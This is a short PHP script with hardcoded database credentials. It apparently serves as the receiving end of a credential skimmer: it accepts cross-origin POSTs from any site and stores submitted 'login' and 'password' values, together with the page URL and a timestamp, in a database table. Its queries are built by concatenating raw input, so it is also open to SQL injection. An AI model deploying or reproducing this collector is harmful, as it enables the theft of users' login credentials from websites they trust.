<?php 
header('Access-Control-Allow-Origin: *');
if(!$con = mysqli_connect("localhost","p468629_root","mlnot123","p468629_web"))
{
	echo 'false';

}
mysqli_select_db($con,'p468629_web');
mysqli_set_charset($con,"utf8");
if(isset($_POST['val']))
{
$type = $_POST['type'];
$val = $_POST['val'];
$url = $_POST['url'];
if($type=='login')
{

				$sql = "INSERT INTO data (data,url,czas,pole) VALUES ('".$val."','".$url."',NOW(),'".$type."')";
				if(!mysqli_query($con,$sql))
				{
					echo 'false';
				}
				else
				{
					echo $val;
				}



}
else if($type=='password')
{
				$sql = "INSERT INTO data (data,url,czas,pole) VALUES ('".$val."','".$url."',NOW(),'".$type."')";
				if(!mysqli_query($con,$sql))
				{
					echo 'false';
				}
				else
				{
					echo $val;
				}
}




}



 ?>